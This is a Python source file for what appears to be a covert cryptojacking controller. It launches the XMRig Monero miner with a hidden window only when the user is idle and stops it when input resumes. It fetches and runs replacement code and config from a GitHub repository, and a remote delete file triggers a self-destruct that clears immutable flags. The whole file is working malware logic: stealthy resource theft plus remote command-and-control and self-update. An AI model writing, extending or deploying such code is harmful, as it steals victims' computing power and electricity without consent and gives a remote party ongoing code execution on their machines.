#!/usr/bin/env python3
import sys
import os
import shutil
import subprocess
import time
import psutil
import ctypes
import platform
import json
from datetime import datetime
import socket
import hashlib
import requests

# ============================================================
# PATHS & CONFIG
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Windows uses LOCALAPPDATA, Linux uses HOME
LOCALAPP = os.getenv("LOCALAPPDATA") or os.path.expanduser("~")
SAFE_DIR = os.path.join(LOCALAPP, "SystemController")

CONFIG_FILE = os.path.join(BASE_DIR, "config_high.json")
INJECTED_CFG = os.path.join(BASE_DIR, "config_injected.json")
LOG_FILE = os.path.join(BASE_DIR, "controller.log")
WALLET_FILE = os.path.join(BASE_DIR, "wallet.txt")

# URLs
GITHUB_CONFIG_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/config_high.json"
GITHUB_CONTROLLER_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/controller.py"
GITHUB_DELETE_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/delete.txt"

# Timing
GITHUB_UPDATE_INTERVAL = 150
_last_update = 0
IDLE_THRESHOLD = 30

HOSTNAME = socket.gethostname()

# Miner selection
MINER_EXE = "xmrig.exe" if os.name == "nt" else "./xmrig"
XM_LOG = os.path.join(BASE_DIR, "miner_xmrig.log")

# ============================================================
# LOGGING
# ============================================================

def log(msg):
    stamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(stamp + msg + "\n")
    except:
        pass
    print(stamp + msg)

# ============================================================
# UTILITIES
# ============================================================

def sha256_bytes(data):
    try:
        return hashlib.sha256(data).hexdigest()
    except:
        return None

def sha256_file(path):
    try:
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return None

# Cross-platform idle detection
def get_idle_seconds():
    """WINDOWS → ctypes.windll
       LINUX   → xprintidle
    """
    if os.name == "nt":
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint),
                        ("dwTime", ctypes.c_ulong)]
        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(lii)
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        return millis / 1000.0

    else:
        # Linux
        try:
            out = subprocess.run(["xprintidle"], capture_output=True, text=True)
            if out.returncode == 0:
                return float(out.stdout.strip()) / 1000.0
        except:
            pass

        return 0.0  # fallback → treat as active

def load_wallet():
    try:
        with open(WALLET_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    except:
        log("[ERROR] wallet.txt missing")
        return None

# ============================================================
# GITHUB UPDATER
# ============================================================

def pull_github_updates():
    """Handles:
       • delete.txt  → self destruct
       • config_high.json update
       • controller.py self-update + restart
    """

    global _last_update
    now = time.time()
    if now - _last_update < GITHUB_UPDATE_INTERVAL:
        return False
    _last_update = now

    log("[UPDATE] Checking GitHub for updates...")

    # --------------------------------------------------------
    # 1. DELETE COMMAND
    # --------------------------------------------------------
    try:
        r = requests.get(GITHUB_DELETE_URL, timeout=10)
        if r.status_code == 200:
            log("[SELF-DESTRUCT] delete.txt detected")

            if os.name != "nt":
                try:
                    subprocess.run(["chattr", "-Ri", SAFE_DIR], check=False)
                except:
                    pass

            shutil.rmtree(SAFE_DIR, ignore_errors=True)
            os._exit(0)
    except Exception as e:
        log(f"[DELETE CHECK ERROR] {e}")

    # --------------------------------------------------------
    # 2. UPDATE CONFIG
    # --------------------------------------------------------
    cfg_changed = False

    try:
        old_hash = sha256_file(CONFIG_FILE)

        r = requests.get(GITHUB_CONFIG_URL, timeout=10)
        if r.status_code == 200:
            new_bytes = r.content
            if sha256_bytes(new_bytes) != old_hash:
                with open(CONFIG_FILE, "wb") as f:
                    f.write(new_bytes)
                cfg_changed = True
                log("[UPDATE] config_high.json updated")
            else:
                log("[UPDATE] config_high.json already latest")
        else:
            log(f"[ERROR] config_high.json HTTP {r.status_code}")

    except Exception as e:
        log(f"[ERROR] updating config_high.json: {e}")

    # --------------------------------------------------------
    # 3. SELF-UPDATE controller.py
    # --------------------------------------------------------
    try:
        r = requests.get(GITHUB_CONTROLLER_URL, timeout=10)

        local_path = os.path.join(BASE_DIR, "controller.py")
        if r.status_code == 200 and len(r.content) > 50:

            try:
                with open(local_path, "rb") as f:
                    old = f.read()
            except FileNotFoundError:
                old = None

            if old != r.content:
                log("[UPDATE] controller.py updated — restarting")

                with open(local_path, "wb") as f:
                    f.write(r.content)

                python = sys.executable
                os.execv(python, [python, local_path])

        else:
            log("[UPDATE] controller.py missing/invalid on GitHub")

    except Exception as e:
        log(f"[ERROR] updating controller.py: {e}")

    return cfg_changed

# ============================================================
# MINER CONTROL
# ============================================================

def start_xmrig():
    wallet = load_wallet()
    if not wallet:
        log("[ERROR] No wallet loaded")
        return None

    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            cfg = json.load(f)
    except Exception as e:
        log(f"[ERROR] loading config_high.json: {e}")
        return None

    # Inject wallet + hostname
    try:
        cfg["pools"][0]["user"] = cfg["pools"][0]["user"].replace("__WALLET__", wallet)
        cfg["pools"][0]["pass"] = HOSTNAME
        with open(INJECTED_CFG, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        log(f"[ERROR] failed writing injected config: {e}")
        return None

    # Launch miner
    cmd = [MINER_EXE, "-c", INJECTED_CFG]

    try:
        if os.name == "nt":
            return subprocess.Popen(
                cmd,
                stdout=open(XM_LOG, "a", encoding="utf-8"),
                stderr=subprocess.STDOUT,
                creationflags=0x08000000,
                cwd=BASE_DIR
            )
        else:
            return subprocess.Popen(
                cmd,
                stdout=open(XM_LOG, "a", encoding="utf-8"),
                stderr=subprocess.STDOUT,
                cwd=BASE_DIR
            )
    except Exception as e:
        log(f"[ERROR] launching miner: {e}")
        return None

def stop_proc(proc):
    if proc and proc.poll() is None:
        log("Stopping miner...")
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            proc.kill()
        log("Miner stopped")

# ============================================================
# MAIN LOOP
# ============================================================

def main():
    xmrig_proc = None
    xmrig_mode = "off"

    log(f"Controller started on {platform.system()}")

    # Pre-check for GitHub changes
    if pull_github_updates():
        xmrig_proc = start_xmrig()
        xmrig_mode = "on"

    while True:
        idle = get_idle_seconds()
        cpu = psutil.cpu_percent(interval=1)
        idle_state = idle > IDLE_THRESHOLD

        # Start on idle
        if idle_state and xmrig_mode == "off":
            xmrig_proc = start_xmrig()
            xmrig_mode = "on"
            log("[XMRIG] Started")

        # Stop on activity
        if not idle_state and xmrig_mode == "on":
            stop_proc(xmrig_proc)
            xmrig_proc = None
            xmrig_mode = "off"
            log("[XMRIG] Stopped")

        # Restart crash
        if xmrig_proc and xmrig_proc.poll() is not None:
            xmrig_proc = start_xmrig()

        # Check GitHub updates
        if pull_github_updates():
            stop_proc(xmrig_proc)
            xmrig_proc = start_xmrig()
            xmrig_mode = "on"

        time.sleep(2)

# ============================================================
# ENTRY
# ============================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Controller stopped by user.")
